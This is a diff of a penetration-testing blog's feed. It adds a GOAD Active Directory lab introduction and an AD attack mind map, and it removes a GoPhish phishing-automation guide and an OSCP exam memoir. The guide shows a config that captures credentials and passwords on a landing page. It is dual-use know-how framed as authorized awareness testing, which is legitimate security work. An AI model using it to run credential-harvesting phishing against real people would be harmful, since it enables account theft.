+<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQejFqhECNVa7qho8EG-6ME84L0Ss1REHczjyyeCUnhJYUmn9M4ONPjXhLfnKKEgKxYH8&amp;usqp=CAU" alt="Proxmox Interface" /></p>
+
+<hr />
+
+<h3 id="dual-approach-to-learning">Dual Approach to Learning</h3>
+
+<p>To cater to diverse interests and expertise levels, the blog series will have two parallel tracks:</p>
+
+<ol>
+  <li>
+    <p><strong>IT Lab Setup</strong><br />
+Focused on the technical configurations, hardware requirements, and network setup.</p>
+  </li>
+  <li>
+    <p><strong>Walkthrough of the Lab</strong><br />
+A step-by-step exploration of domain enumeration, reconnaissance, and exploitation techniques.</p>
+  </li>
+</ol>
+
+<hr />
+
+<h3 id="stay-tuned">Stay Tuned</h3>
+
+<p>This is just the beginning! The next post will cover the <strong>infrastructure setup</strong> in detail, including hardware choices, hypervisor installation, and initial configurations.</p>
+
+<p>Whether you’re setting up your first lab or expanding your knowledge, there’s much to learn and discover. Stay tuned for more updates, and let’s embark on this exciting journey together!</p>
+
+<hr />]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD," /><category term="HomeLab" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">Mind Map for Active Directory - Pentesting</title><link href="http://localhost:4000/goad/mindmap/" rel="alternate" type="text/html" title="Mind Map for Active Directory - Pentesting" /><published>2024-11-13T00:00:00+05:30</published><updated>2024-11-13T00:00:00+05:30</updated><id>http://localhost:4000/goad/mindmap</id><content type="html" xml:base="http://localhost:4000/goad/mindmap/"><![CDATA[<h1 id="active-directory-mindmap-for-beginers">Active Directory MindMap For Beginers:</h1>
 
 <div class="mermaid">
 graph TB; A[AD Security Assessment] --&gt; B[Assume Breach]; A --&gt; C[External Assessment]; B --&gt; D[Domain Enumeration]; B --&gt; E[Privilege Analysis]; B --&gt; F[Attack Paths]; D --&gt; D1[ACL Analysis]; D1 --&gt; D1A[Bloodhound]; D1 --&gt; D1B[PowerView]; D --&gt; D2[Trust Relationships]; D2 --&gt; D2A[Inter-realm trusts]; D2 --&gt; D2B[Forest trusts]; D --&gt; D3[Service Discovery]; D3 --&gt; D3A[MSSQL]; D3 --&gt; D3B[Exchange]; D3 --&gt; D3C[ADFS]; E --&gt; E1[Group Memberships]; E1 --&gt; E1A[Nested Groups]; E1 --&gt; E1B[Local Admins]; E --&gt; E2[Service Accounts]; E2 --&gt; E2A[Constrained Delegation]; E2 --&gt; E2B[Unconstrained Delegation]; E --&gt; E3[Shadow Admins]; E3 --&gt; E3A[DCSync Rights]; E3 --&gt; E3B[WriteDACL]; F --&gt; F1[Tiered Access]; F1 --&gt; F1A[Workstation to Server]; F1 --&gt; F1B[Server to DC]; F --&gt; F2[Lateral Movement]; F2 --&gt; F2A[Pass-the-Hash]; F2 --&gt; F2B[Pass-the-Ticket]; F --&gt; F3[Certificate Abuse]; F3 --&gt; F3A[ESC1-8]; F3 --&gt; F3B[ADCS]; C --&gt; G[External Recon]; C --&gt; H[Initial Access Vectors]; C --&gt; I[Post Compromise]; G --&gt; G1[Domain Discovery]; G1 --&gt; G1A[DNS Enumeration]; G1 --&gt; G1B[Subdomain Scanning]; G --&gt; G2[Service Enumeration]; G2 --&gt; G2A[VPN Endpoints]; G2 --&gt; G2B[Mail Servers]; G2 --&gt; G2C[Web Applications]; G --&gt; G3[OSINT]; G3 --&gt; G3A[Email Formats]; G3 --&gt; G3B[Employee Lists]; G3 --&gt; G3C[Public Shares]; H --&gt; H1[Perimeter Attacks]; H1 --&gt; H1A[Password Spraying]; H1 --&gt; H1B[VPN Exploitation]; H1 --&gt; H1C[Phishing Campaign]; H --&gt; H2[Service Targeting]; H2 --&gt; H2A[Exchange]; H2A --&gt; H2A1[ProxyLogon]; H2A --&gt; H2A2[ProxyShell]; H2 --&gt; H2B[RDP/VNC]; H2B --&gt; H2B1[BlueKeep]; H2B --&gt; H2B2[Default Creds]; H2 --&gt; H2C[VPN]; H2C --&gt; H2C1[Pulse Secure]; H2C --&gt; H2C2[FortiGate]; I --&gt; I1[Internal Recon]; I1 --&gt; I1A[Network Segmentation]; I1 --&gt; I1B[Trust Relationships]; I --&gt; I2[Domain Join]; I2 --&gt; I2A[LLMNR/NBTNS]; I2 --&gt; I2B[IPv6 Attacks]; I --&gt; I3[Privilege Escalation]; I3 --&gt; I3A[Local to Domain]; I3 --&gt; I3B[Domain to Enterprise];
@@ -1217,719 +1448,4 @@ python html_obfuscator.py <span class="nt">-oD</span> <span class="nt">-P</span>
 
 <hr />
 
-<p><em>Note: Regular updates and community feedback help improve tool effectiveness and security.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python" /><summary type="html"><![CDATA[Simple Python program to Obfuscate and Dobfuscate HTML files. The program also allows you to obfuscate and Dobfuscate multiple files in one go.]]></summary></entry><entry><title type="html">GoAutoPhish</title><link href="http://localhost:4000/tools/GoAuto-Phish/" rel="alternate" type="text/html" title="GoAutoPhish" /><published>2024-09-20T00:00:00+05:30</published><updated>2024-09-20T00:00:00+05:30</updated><id>http://localhost:4000/tools/GoAuto-Phish</id><content type="html" xml:base="http://localhost:4000/tools/GoAuto-Phish/"><![CDATA[<h1 id="automating-phishing-campaigns-with-gophish-a-complete-guide">Automating Phishing Campaigns with GoPhish: A Complete Guide</h1>
-
-<h2 id="introduction">Introduction</h2>
-
-<p>In the realm of cybersecurity assessment, phishing simulations play a crucial role in evaluating and improving an organization’s security awareness. Today, we’ll explore a powerful automation tool that streamlines the process of creating and managing phishing campaigns using GoPhish’s API. The <a href="https://github.com/DcodeZero/Gophish-Automation">GoPhish-Automation</a> project offers a robust solution for security professionals looking to enhance their phishing simulation capabilities.</p>
-
-<h2 id="understanding-gophish-automation">Understanding GoPhish Automation</h2>
-
-<p>GoPhish Automation is a Python-based project that simplifies the creation and management of phishing campaigns. By leveraging the GoPhish API, it automates template management, sending profiles, and campaign creation while incorporating advanced features like error handling, custom headers, and rate limiting.</p>
-
-<h2 id="project-structure">Project Structure</h2>
-
-<p>The project follows a clean, organized structure:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/GoPhish-Automation/
-│
-├── /templates/
-│   ├── template1.txt
-│   ├── template2.txt
-│   └── template3.txt
-│
-├── /logs/
-│   └── phishing_campaign.log
-│
-├── config.json
-│
-└── configauto.py
-</code></pre></div></div>
-
-<h3 id="key-components">Key Components</h3>
-
-<ol>
-  <li><strong>Templates Directory</strong>: Stores email templates in text format</li>
-  <li><strong>Logs Directory</strong>: Contains campaign execution logs</li>
-  <li><strong>Configuration File</strong>: Manages campaign settings and credentials</li>
-  <li><strong>Main Script</strong>: Handles the automation logic</li>
-</ol>
-
-<h2 id="setting-up-the-environment">Setting Up the Environment</h2>
-
-<h3 id="prerequisites">Prerequisites</h3>
-
-<p>Before diving in, ensure you have:</p>
-
-<ul>
-  <li>Python 3.x installed</li>
-  <li>A running GoPhish server</li>
-  <li>GoPhish API key</li>
-  <li>Basic understanding of phishing campaigns</li>
-</ul>
-
-<h3 id="installation-steps">Installation Steps</h3>
-
-<ol>
-  <li>Clone the repository:
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/DcodeZero/Gophish-Automation.git
-<span class="nb">cd </span>Gophish-Automation
-</code></pre></div>    </div>
-  </li>
-  <li>Install required packages:
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install </span>gophish
-</code></pre></div>    </div>
-  </li>
-</ol>
-
-<h2 id="configuration-deep-dive">Configuration Deep Dive</h2>
-
-<p>The <code class="language-plaintext highlighter-rouge">config.json</code> file is the heart of the configuration. Here’s a detailed breakdown:</p>
-
-<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
-  </span><span class="nl">"api_key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"your_api_key_here"</span><span class="p">,</span><span class="w">
-  </span><span class="nl">"host"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://your_gophish_server_url"</span><span class="p">,</span><span class="w">
-  </span><span class="nl">"template"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="nl">"is_base64"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
-    </span><span class="nl">"send_all_types"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
-  </span><span class="p">},</span><span class="w">
-  </span><span class="nl">"smtp_profiles"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
-    </span><span class="p">{</span><span class="w">
-      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Profile1"</span><span class="p">,</span><span class="w">
-      </span><span class="nl">"host"</span><span class="p">:</span><span class="w"> </span><span class="s2">"smtp.example.com"</span><span class="p">,</span><span class="w">
-      </span><span class="nl">"from_address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"phish@example.com"</span><span class="p">,</span><span class="w">
-      </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"user1"</span><span class="p">,</span><span class="w">
-      </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"password1"</span><span class="p">,</span><span class="w">
-      </span><span class="nl">"ignore_cert_errors"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
-      </span><span class="nl">"headers"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
-        </span><span class="p">{</span><span class="nl">"key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"X-Header"</span><span class="p">,</span><span class="w"> </span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Foo Bar"</span><span class="p">}</span><span class="w">
-      </span><span class="p">]</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-  </span><span class="p">],</span><span class="w">
-  </span><span class="nl">"group"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Phishing Group"</span><span class="p">,</span><span class="w">
-    </span><span class="nl">"targets"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
-      </span><span class="p">{</span><span class="w">
-        </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"target1@example.com"</span><span class="p">,</span><span class="w">
-        </span><span class="nl">"first_name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"John"</span><span class="p">,</span><span class="w">
-        </span><span class="nl">"last_name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Doe"</span><span class="w">
-      </span><span class="p">}</span><span class="w">
-    </span><span class="p">]</span><span class="w">
-  </span><span class="p">},</span><span class="w">
-  </span><span class="nl">"landing_page"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Phishing Page"</span><span class="p">,</span><span class="w">
-    </span><span class="nl">"html"</span><span class="p">:</span><span class="w"> </span><span class="s2">"base64_encoded_html_here"</span><span class="p">,</span><span class="w">
-    </span><span class="nl">"is_base64"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
-    </span><span class="nl">"capture_credentials"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
-    </span><span class="nl">"capture_passwords"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
-  </span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<h3 id="configuration-components">Configuration Components</h3>
-
-<ol>
-  <li><strong>API Configuration</strong>
-    <ul>
-      <li>API key authentication</li>
-      <li>GoPhish server host URL</li>
-    </ul>
-  </li>
-  <li><strong>Template Settings</strong>
-    <ul>
-      <li>Base64 encoding options</li>
-      <li>Multiple template type support</li>
-    </ul>
-  </li>
-  <li><strong>SMTP Profiles</strong>
-    <ul>
-      <li>Email server configurations</li>
-      <li>Custom header support</li>
-      <li>Certificate handling</li>
-    </ul>
-  </li>
-  <li><strong>Target Groups</strong>
-    <ul>
-      <li>Target recipient management</li>
-      <li>Personalization options</li>
-    </ul>
-  </li>
-  <li><strong>Landing Pages</strong>
-    <ul>
-      <li>HTML content configuration</li>
-      <li>Credential capture settings</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="creating-email-templates">Creating Email Templates</h2>
-
-<p>Templates are stored in <code class="language-plaintext highlighter-rouge">.txt</code> files with a specific format:</p>
-
-<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Subject: Your Compelling Subject Line
-HTML: &lt;html&gt;
-&lt;body&gt;
-&lt;p&gt;Dear {FIRST_NAME},&lt;/p&gt;
-&lt;p&gt;Your phishing content here...&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre></div></div>
-
-<h3 id="template-best-practices">Template Best Practices</h3>
-
-<ol>
-  <li>Use variables for personalization</li>
-  <li>Structure HTML properly</li>
-  <li>Include both plain text and HTML versions</li>
-  <li>Test templates before deployment</li>
-</ol>
-
-<h2 id="advanced-features">Advanced Features</h2>
-
-<h3 id="1-error-handling-and-logging">1. Error Handling and Logging</h3>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
-    <span class="c1"># Campaign operation
-</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Campaign created successfully"</span><span class="p">)</span>
-<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-    <span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s">"Campaign creation failed: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
-</code></pre></div></div>
-
-<h3 id="2-rate-limiting">2. Rate Limiting</h3>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_campaign</span><span class="p">(</span><span class="n">profile</span><span class="p">,</span> <span class="n">delay</span><span class="o">=</span><span class="mi">60</span><span class="p">):</span>
-    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">delay</span><span class="p">)</span>
-    <span class="c1"># Campaign sending logic
-</span></code></pre></div></div>
-
-<h3 id="3-custom-headers">3. Custom Headers</h3>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">headers</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="p">{</span><span class="s">"key"</span><span class="p">:</span> <span class="s">"X-Priority"</span><span class="p">,</span> <span class="s">"value"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">},</span>
-    <span class="p">{</span><span class="s">"key"</span><span class="p">:</span> <span class="s">"X-Custom"</span><span class="p">,</span> <span class="s">"value"</span><span class="p">:</span> <span class="s">"Value"</span><span class="p">}</span>
-<span class="p">]</span>
-</code></pre></div></div>
-
-<h2 id="campaign-execution">Campaign Execution</h2>
-
-<p>Running the automation is straightforward:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python AutoGoPhish.py
-</code></pre></div></div>
-
-<p>The script performs:</p>
-
-<ol>
-  <li>Template validation and processing</li>
-  <li>SMTP profile configuration</li>
-  <li>Group creation/update</li>
-  <li>Campaign launch with rate limiting</li>
-  <li>Comprehensive logging</li>
-</ol>
-
-<h2 id="monitoring-and-logging">Monitoring and Logging</h2>
-
-<p>The script maintains detailed logs in <code class="language-plaintext highlighter-rouge">/logs/phishing_campaign.log</code>:</p>
-
-<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2024-03-11 10:15:23 INFO: Starting campaign setup
-2024-03-11 10:15:24 INFO: Template validated successfully
-2024-03-11 10:15:25 INFO: Campaign 'Security Training' launched
-2024-03-11 10:15:26 WARNING: Rate limit applied - waiting 60 seconds
-</code></pre></div></div>
-
-<h2 id="best-practices">Best Practices</h2>
-
-<ol>
-  <li><strong>Template Management</strong>
-    <ul>
-      <li>Regularly update templates</li>
-      <li>Test with small groups first</li>
-      <li>Monitor spam score</li>
-    </ul>
-  </li>
-  <li><strong>Rate Limiting</strong>
-    <ul>
-      <li>Adjust based on SMTP provider</li>
-      <li>Monitor delivery rates</li>
-      <li>Implement progressive delays</li>
-    </ul>
-  </li>
-  <li><strong>Error Handling</strong>
-    <ul>
-      <li>Monitor logs regularly</li>
-      <li>Set up alerts for failures</li>
-      <li>Maintain backup configurations</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="security-considerations">Security Considerations</h2>
-
-<ol>
-  <li><strong>API Key Protection</strong>
-    <ul>
-      <li>Store securely</li>
-      <li>Rotate regularly</li>
-      <li>Use environment variables</li>
-    </ul>
-  </li>
-  <li><strong>SMTP Security</strong>
-    <ul>
-      <li>Use encryption</li>
-      <li>Implement SPF/DKIM</li>
-      <li>Monitor for abuse</li>
-    </ul>
-  </li>
-  <li><strong>Data Protection</strong>
-    <ul>
-      <li>Encrypt sensitive data</li>
-      <li>Clean up after campaigns</li>
-      <li>Follow data retention policies</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="conclusion">Conclusion</h2>
-
-<p>The GoPhish-Automation project significantly streamlines the process of managing phishing campaigns. By automating routine tasks and implementing best practices, security teams can focus on analyzing results and improving security awareness programs.</p>
-
-<h2 id="resources">Resources</h2>
-
-<ul>
-  <li><a href="https://github.com/DcodeZero/Gophish-Automation">GitHub Repository</a></li>
-  <li><a href="https://docs.getgophish.com">GoPhish Documentation</a></li>
-  <li><a href="https://github.com/gophish/api-client-python">Python GoPhish Library</a></li>
-</ul>
-
-<hr />
-
-<p><em>Note: This tool should only be used for legitimate security testing with proper authorization.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python," /><category term="GoPhish" /><summary type="html"><![CDATA[This project automates the creation and management of phishing campaigns using the GoPhish API. The script handles template management, sending profiles, and campaign creation with advanced features such as error handling, custom headers, and rate limiting.]]></summary></entry><entry><title type="html">My journey towards “TRY HARDER!”</title><link href="http://localhost:4000/otherposts/OSCP/" rel="alternate" type="text/html" title="My journey towards “TRY HARDER!”" /><published>2020-10-17T00:00:00+05:30</published><updated>2020-10-17T00:00:00+05:30</updated><id>http://localhost:4000/otherposts/OSCP</id><content type="html" xml:base="http://localhost:4000/otherposts/OSCP/"><![CDATA[<hr />
-
-<h1 id="overview">OverView</h1>
-<p>It was <code class="language-plaintext highlighter-rouge">one and half</code> years ago I completed my <code class="language-plaintext highlighter-rouge">C|EH</code> certification. Since then my only <code class="language-plaintext highlighter-rouge">aim</code> was to gain my <code class="language-plaintext highlighter-rouge">OSCP</code> no matter what it takes from me. I was ready to give my complete effort and dedication in order to gain my OSCP. This blog outlines <code class="language-plaintext highlighter-rouge">my journey towards OSCP</code> and I’ll be sharing some hints and guidelines at the end of the blog which can be helpful in gaining your OSCP as well.</p>
-
-<hr />
-
-<h1 id="background">Background</h1>
-<p>Before I get started my journey towards OSCP, I am a computer science student, finished my <code class="language-plaintext highlighter-rouge">master’s degree</code>. But had no experience in the field of cyber security. I strongly had a passion towards security and precisely towards <code class="language-plaintext highlighter-rouge">breaking into things</code>. This is all the mind set required in cyber security industry. My first intension was to get my <code class="language-plaintext highlighter-rouge">C|EH</code>, but it has not satisfied me and I wanted more of it. Then I’ve taken <code class="language-plaintext highlighter-rouge">OSCP as a challenge</code> to myself and the journey begins now.</p>
-
-<hr />
-
-<h1 id="the-journey">The Journey</h1>
-
-<p>This journey started about <code class="language-plaintext highlighter-rouge">9 months</code> ago, I took the <code class="language-plaintext highlighter-rouge">VIP</code> subscription from <code class="language-plaintext highlighter-rouge">Hack The Box</code> and started to hack into some <code class="language-plaintext highlighter-rouge">retired easy machines</code> to gain some skill and confidence. But the situation was quite difficult for me and I was unable to get even an initial foothold of any machine. However, within a short period, I was able to get the easy machines pawned. Once I gained confidence in cracking the machines, I slowly moved towards the <code class="language-plaintext highlighter-rouge">Active Machines</code> section. Within a period of 3 months I had all the easy and medium machine owned. <img src="/assets/img/sample/AMO.png" alt="" /> By the time of <code class="language-plaintext highlighter-rouge">6 months</code> after starting <code class="language-plaintext highlighter-rouge">HTB</code>, I almost had about 50+ machines owned. I had also completed the <code class="language-plaintext highlighter-rouge">TJNULL’s OSCP machines list</code>. At this point, I was pretty confident that I’m ready for my OSCP exam.</p>
-
-<hr />
-
-<h1 id="the-plan">The Plan</h1>
-
-<p>Once I gained confidence, I felt like I’m ready for the battle. I came to know that there are <code class="language-plaintext highlighter-rouge">60+ machines</code> in the OSCP lab. My idea was to go with 2 months of lab time and hack into at least 40+ machines. I started my lab access on <code class="language-plaintext highlighter-rouge">2-8-20</code> and by the time of <code class="language-plaintext highlighter-rouge">1-10-20</code> I have done 54 machines, which I didn’t expect.</p>
-
-<hr />
-
-<h2 id="first-month">First Month</h2>
-
-<p>In the beginning, I was given the access with credentials to log into the forums and the VPN to get connected to their network. The <code class="language-plaintext highlighter-rouge">guide lines</code> were straight forward and the <code class="language-plaintext highlighter-rouge">map</code> to hack the lab machines was quite interesting to me. This interested me more in doing a lot of machines and I strongly had a feeling that I’m going to learn a lot of things in this two months of my journey. I started to read the <code class="language-plaintext highlighter-rouge">material provided my Offensive Security</code> for 3 days and trying to complete a few machines if possible. The material consists of really good content and the videos were a lot helpful.</p>
-
-<h2 id="second-month">Second Month</h2>
-
-<p>I was pretty much <code class="language-plaintext highlighter-rouge">fed up</code> with doing scans manually as it is wasting a lot of my time, then I had to move towards <code class="language-plaintext highlighter-rouge">automation</code>. I have written my own scripts to automate the scans to make my work much easier. This way I learned a lot of coding and kind of automating. Slowly I was able to complete the <code class="language-plaintext highlighter-rouge">top 5 machines</code>, which made me feel awesome. Slowly the time passed by and now the fun part begins. At this point I almost had all the individual machines <code class="language-plaintext highlighter-rouge">compromised</code> and while tackling with the other machines, I was not able to get anything out of these machines. Looking out from the forums I understood that some machines have <code class="language-plaintext highlighter-rouge">dependencies</code> and some machines have a <code class="language-plaintext highlighter-rouge">chain of dependencies</code>. It took me a lot of time in understanding the dependencies and mapping it from one machine to the other. The overall journey in the lab time was <code class="language-plaintext highlighter-rouge">frustrating and fun</code>, I could never forget this ever.</p>
-
-<hr />
-
-<h1 id="before-exam">Before Exam</h1>
-
-<p>I have <code class="language-plaintext highlighter-rouge">registered the exam</code> after a week to the end of my lab access. I tried to relax myself for the whole week and doing the <code class="language-plaintext highlighter-rouge">lab report</code> simultaneously. I was able to successfully complete the lab report within one-week and <code class="language-plaintext highlighter-rouge">revisited</code> all the machines that I’ve done in the lab. During this process I had made my own <code class="language-plaintext highlighter-rouge">cheat sheet</code> so that I can organize and remember the things well. Trust me this was a <code class="language-plaintext highlighter-rouge">life savior</code>. Just the day before the exam I was super nervous, my mind was <code class="language-plaintext highlighter-rouge">rushing</code> with different thoughts about the exam and keeping my mind stable and cool was <code class="language-plaintext highlighter-rouge">literally not possible</code>. After a good night sleep, I woke up with a fresh mind at <code class="language-plaintext highlighter-rouge">7 am</code>, had my breakfast and took a nice warm shower. It was about <code class="language-plaintext highlighter-rouge">two and half hours</code> just before the exam…</p>
-
-<hr />
-
-<h2 id="the-exam-plan">The Exam Plan</h2>
-
-<blockquote>
-  <p>Had to finish the buffer over flow machine in <code class="language-plaintext highlighter-rouge">2 hours</code> at maximum.<br />
-Move to the easiest machine i.e. 10 marks machine and finish it in an <code class="language-plaintext highlighter-rouge">hour or two</code> at maximum.<br />
-Then tackle with the other two 20 marks machines with in a time of <code class="language-plaintext highlighter-rouge">10 hours</code> maximum.<br />
-If all goes in the planned way, I should be still having time for the last <code class="language-plaintext highlighter-rouge">25 marks machine</code>.<br /></p>
-</blockquote>
-
-<hr />
-
-<h1 id="the-exam-time">The Exam Time</h1>
-<p>I started my exam at <code class="language-plaintext highlighter-rouge">9:45 am</code> sharp. The guide lines are pretty straightforward and I picked the Buffer overflow machine as my first choice. It took me about 4 hours to solve the machine because of some silly and manual mistakes. Next, I went with the easiest <code class="language-plaintext highlighter-rouge">10 marks</code> machine which took me <code class="language-plaintext highlighter-rouge">15 min</code> to compromise the machine with some change in the exploit code. Though BOF took me <code class="language-plaintext highlighter-rouge">4 hours</code>, I managed to solve the <code class="language-plaintext highlighter-rouge">10 marks</code> machine super quick. So according to the plan I was going in the right direction with time. 
-Once I knew that I had <code class="language-plaintext highlighter-rouge">35 marks</code> in hand, I took a small break and had my lunch. I got back to my seat at <code class="language-plaintext highlighter-rouge">2:00 pm</code> and started to tackle with one of the <code class="language-plaintext highlighter-rouge">20 marks</code> machine. An hour and half later I’m able to get the initial foothold of the machine. I tried harder for so much time to compromise the machine completely, but no luck after a really long time. Then I moved on to the other <code class="language-plaintext highlighter-rouge">20 marks</code> and tried hitting the machine for a really long time, but unable to get even an initial foothold out of it.</p>
-
-<p>The time passed by really quick and now the time is <code class="language-plaintext highlighter-rouge">9:00 pm</code>, but still nothing. Realizing that I need to calm down myself, I took a straight <code class="language-plaintext highlighter-rouge">2 hours</code> of break and I spend some time with my parents and felt much better. I had a feeling that I’m going in a <code class="language-plaintext highlighter-rouge">wrong loop</code> and I had to break it. This thing is a <code class="language-plaintext highlighter-rouge">game changer</code>, I reverted the machine and started it from the beginning. Once the mind is clear and cool, the ideas are rushing in my head and my <code class="language-plaintext highlighter-rouge">methodology worked</code> fantastic in gaining the privileged access of the machine. My excitement was to peaks. By the time of <code class="language-plaintext highlighter-rouge">01:00 am</code>, I was having <code class="language-plaintext highlighter-rouge">55 marks</code> in my hand. I was so exhausted at this point, so I went for a quick powernap and headed my way again.</p>
-
-<p>Knowing that I already had <code class="language-plaintext highlighter-rouge">55 marks</code>, now all I need is <code class="language-plaintext highlighter-rouge">15 marks</code> more to clear the exam. So, I started to tackle the other <code class="language-plaintext highlighter-rouge">20 marks</code> machine. Within no time I was able to get the root access of the machine. At this point I had <code class="language-plaintext highlighter-rouge">75 marks</code>, which is sufficient to pass the exam and now the time is around <code class="language-plaintext highlighter-rouge">03:00 am</code>. Now my plan of action is to reset all the <code class="language-plaintext highlighter-rouge">4 machines</code> and start them from the beginning and take screenshots of each and every step possible as screen recording is not possible now. By the time of <code class="language-plaintext highlighter-rouge">06:00 am</code>, I had my screenshots ready. I took another <code class="language-plaintext highlighter-rouge">2 hours</code> to verify all the things and confirm all are fine, I ended my exam at <code class="language-plaintext highlighter-rouge">08:00 am</code>. Oh YES! But wait, <code class="language-plaintext highlighter-rouge">the battle has not ended yet</code>.</p>
-
-<h1 id="the-report">The Report</h1>
-
-<p>It took me <code class="language-plaintext highlighter-rouge">5+ hours</code> to complete the <code class="language-plaintext highlighter-rouge">professional exam report</code> and I submitted it with in <code class="language-plaintext highlighter-rouge">24 hours</code> span of time. YES! The battle has finished and now I need to wait for the results to <code class="language-plaintext highlighter-rouge">be positive</code> with <code class="language-plaintext highlighter-rouge">fingers crossed</code>.</p>
-
-<hr />
-<hr />
-<h1 id="the-output">The Output</h1>
-
-<p>It took some where about <code class="language-plaintext highlighter-rouge">3-5 days</code> to get a mail from Offensive Security stating that <code class="language-plaintext highlighter-rouge">you have successfully completed the Penetration Testing with Kali Linux certification exam and have obtained your Offensive Security Certified Professional (OSCP) certification</code>. This is <code class="language-plaintext highlighter-rouge">the moment of truth</code>, I have been craving for months. Now I’m an <code class="language-plaintext highlighter-rouge">OSCP</code>, which I’m so proud of.<br /><br /><br /><img src="/assets/img/sample/OSCP.png" alt="" /></p>
-
-<hr />
-<hr />
-
-<h1 id="tips-and-tricks">Tips and Tricks</h1>
-<p><br /></p>
-
-<h2 id="two-to-three-months-of-hackthebox-and-ippsecs-videos">Two to three months of <code class="language-plaintext highlighter-rouge">HackTheBox</code> and <code class="language-plaintext highlighter-rouge">Ippsec’s</code> videos<br /></h2>
-
-<p>Yes! You definitely need a prior understanding how things work. The best way to learn is to start from the easy machines in HTB, then keep improving yourself.</p>
-
-<h2 id="easy-rated-vulnhub-machines">Easy rated <code class="language-plaintext highlighter-rouge">vulnhub</code> machines.<br /></h2>
-
-<p>Try to do as many boxes from <code class="language-plaintext highlighter-rouge">vulnhub</code>. once the machine is exploited, try to replicate the same vulnerability that you have exploited from the machine on a new machine. Doing so will teach you a lot of stuff.</p>
-
-<h2 id="the-tjnulls-list-of-oscp-like-machines-">The <code class="language-plaintext highlighter-rouge">TJNULL’s List</code> of OSCP like machines. <br /></h2>
-
-<p>As I was talking about it before, once you think you gained confidence doing <code class="language-plaintext highlighter-rouge">HTB</code> and <code class="language-plaintext highlighter-rouge">Vulnhub</code> machines you can make a <code class="language-plaintext highlighter-rouge">mock exam</code>, like taking a few machines from the list and trying to complete them in a <code class="language-plaintext highlighter-rouge">time constraint</code>.</p>
-
-<h2 id="take-help-from-forums-and-communities">Take help from <code class="language-plaintext highlighter-rouge">forums</code> and <code class="language-plaintext highlighter-rouge">Communities</code>.<br /></h2>
-
-<p>Yes! Take help from <code class="language-plaintext highlighter-rouge">forums</code> and other <code class="language-plaintext highlighter-rouge">communities</code>. There are really good people who can help you out in some way or the other way.</p>
-
-<h2 id="the-cheat-sheets">The <code class="language-plaintext highlighter-rouge">Cheat Sheets</code>.<br /></h2>
-
